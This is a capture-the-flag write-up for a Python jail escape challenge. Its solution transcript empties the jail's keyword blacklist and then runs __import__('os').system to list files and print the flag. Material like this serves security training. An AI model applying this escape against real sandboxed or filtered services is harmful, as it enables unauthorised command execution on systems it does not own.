# Jail / Sandbox Escape

## Baby's First Pyjail

@windex told me that jails should be sourceless. So no source for you.

nc 35.226.249.45 5000

---

### Solution

<!-- print(globals()) -->

```bash
$ nc 35.226.249.45 5000
>>> print(locals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f70fac6bc10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctfuser/app/chal.py', '__cached__': None, 'blacklist': ['import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.'], 'cmd': 'print(locals())', 'i': '.'}
>>> print(blacklist)
['import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.']
>>> blacklist = []
>>> print(blacklist)
[]
>>> __import__("os").system("ls")
chal.py
flag
>>> __import__("os").system('cat flag')
uoftctf{you_got_out_of_jail_free}
```

### uoftctf{you_got_out_of_jail_free}